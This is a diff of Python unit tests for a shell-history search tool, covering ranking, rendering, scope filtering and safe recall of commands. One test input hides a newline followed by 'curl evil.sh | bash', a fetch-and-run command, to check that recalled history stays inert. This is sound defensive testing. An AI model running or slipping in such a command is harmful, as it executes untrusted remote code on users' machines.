@@ -52,23 +52,24 @@ class TestRelativeTime(unittest.TestCase):
         self.assertEqual(search.relative_time(NOW + 500, NOW), "now")
 
 
-class TestRank(unittest.TestCase):
+class TestRankRows(unittest.TestCase):
     @staticmethod
-    def _entry(ts: int, cmd: str) -> Entry:
-        return Entry(ts, "h", "s", "/tmp", 0, 0, cmd)
+    def rows(*pairs: tuple[int, str]) -> tuple[list[str], list[str]]:
+        """Stamps come out of the cache as strings, so that is what goes in."""
+        return [str(ts) for ts, _ in pairs], [cmd for _, cmd in pairs]
 
     def test_newest_first(self) -> None:
-        entries = [self._entry(1, "old"), self._entry(3, "new"), self._entry(2, "mid")]
-        self.assertEqual([e.cmd for e in search.rank(entries)], ["new", "mid", "old"])
+        stamps, commands = self.rows((1, "old"), (3, "new"), (2, "mid"))
+        ranked = search.rank_rows(stamps, commands)
+        self.assertEqual([cmd for _, cmd in ranked], ["new", "mid", "old"])
 
     def test_dedup_keeps_the_most_recent_occurrence(self) -> None:
-        entries = [self._entry(1, "git status"), self._entry(5, "git status"), self._entry(3, "ls")]
-        ranked = search.rank(entries)
-        self.assertEqual([(e.ts, e.cmd) for e in ranked], [(5, "git status"), (3, "ls")])
+        stamps, commands = self.rows((1, "git status"), (5, "git status"), (3, "ls"))
+        self.assertEqual(search.rank_rows(stamps, commands), [(5, "git status"), (3, "ls")])
 
     def test_dedup_can_be_disabled(self) -> None:
-        entries = [self._entry(1, "ls"), self._entry(2, "ls")]
-        self.assertEqual(len(search.rank(entries, dedup=False)), 2)
+        stamps, commands = self.rows((1, "ls"), (2, "ls"))
+        self.assertEqual(len(search.rank_rows(stamps, commands, dedup=False)), 2)
 
 
 class TestRenderRoundTrip(unittest.TestCase):
@@ -84,8 +85,7 @@ class TestRenderRoundTrip(unittest.TestCase):
             "über 😀",
             "x" * 300,
         ]
-        entries = [Entry(NOW, "h", "s", "/tmp", 0, 0, cmd) for cmd in commands]
-        lines = search.render(entries, now=NOW)
+        lines = search.render_rows([(NOW, cmd) for cmd in commands], now=NOW)
 
         for line, cmd in zip(lines, commands, strict=True):
             with self.subTest(cmd=cmd):
@@ -96,28 +96,42 @@ class TestRenderRoundTrip(unittest.TestCase):
 
 
 class TestScope(WoswoarTestCase):
-    def _entries(self) -> list[Entry]:
-        return [
-            Entry(1, MACHINE_ID, "here", "/tmp", 0, 0, "mine, this shell"),
-            Entry(2, MACHINE_ID, "elsewhere", "/tmp", 0, 0, "mine, other shell"),
-            Entry(3, "ffffffffffffffff", "remote", "/tmp", 0, 0, "another machine"),
-        ]
+    """Driven through `lines_for`, which is the path Ctrl-R takes.
+
+    These used to call `filter_scope` on a hand-built list. That function is
+    gone -- the scopes are answered from the cache's columns now, and `host`
+    without looking at a single row, because the host belongs to the file. A
+    test of the old helper would have kept passing while the live path did
+    something else, which is exactly what happened when this was written.
+    """
+
+    def record(self, ts: int, cmd: str, host: str = MACHINE_ID, session: str = "here") -> None:
+        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
+            handle.write(format_line(Entry(ts, host, session, "/tmp", 0, 0, cmd)) + "\n")
+
+    def setUp(self) -> None:
+        super().setUp()
+        self.record(1, "mine, this shell")
+        self.record(2, "mine, other shell", session="elsewhere")
+        self.record(3, "another machine", host="ffffffffffffffff", session="remote")
+
+    @staticmethod
+    def commands(scope: search.Scope) -> list[str]:
+        return [search.command_from_line(line) for line in search.lines_for(scope)]
 
     def test_global_keeps_everything(self) -> None:
-        self.assertEqual(len(search.filter_scope(self._entries(), "global")), 3)
+        self.assertEqual(len(self.commands("global")), 3)
 
     def test_host_keeps_this_machine(self) -> None:
-        got = search.filter_scope(self._entries(), "host")
-        self.assertEqual([e.cmd for e in got], ["mine, this shell", "mine, other shell"])
+        self.assertEqual(sorted(self.commands("host")), ["mine, other shell", "mine, this shell"])
 
     def test_session_keeps_this_shell(self) -> None:
         os.environ["WOSWOAR_SESSION"] = "here"
-        got = search.filter_scope(self._entries(), "session")
-        self.assertEqual([e.cmd for e in got], ["mine, this shell"])
+        self.assertEqual(self.commands("session"), ["mine, this shell"])
 
     def test_session_without_the_hook_is_empty_not_an_error(self) -> None:
         os.environ.pop("WOSWOAR_SESSION", None)
-        self.assertEqual(search.filter_scope(self._entries(), "session"), [])
+        self.assertEqual(self.commands("session"), [])
 
 
 class TestFzfArgv(unittest.TestCase):
@@ -149,8 +163,7 @@ class TestRecalledCommandIsInert(unittest.TestCase):
     """
 
     def _round_trip(self, cmd: str) -> str:
-        entry = Entry(NOW, "h", "s", "/tmp", 0, 0, cmd)
-        return search.command_from_line(search.render([entry], now=NOW)[0])
+        return search.command_from_line(search.render_rows([(NOW, cmd)], now=NOW)[0])
 
     def test_an_embedded_newline_does_not_become_a_second_command(self) -> None:
         recalled = self._round_trip("echo visible" + " " * 200 + "\ncurl evil.sh | bash")
